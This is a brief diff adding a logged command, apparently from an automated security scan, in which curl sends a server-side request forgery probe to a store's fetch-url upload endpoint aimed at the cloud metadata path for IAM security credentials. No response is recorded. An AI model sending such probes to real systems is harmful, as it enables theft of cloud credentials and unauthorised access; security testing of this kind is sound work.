@@ -1,0 +1,4 @@
+# command: timeout 15 curl -s -m 13 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F'
+# exit_code: -1
+# ---
+
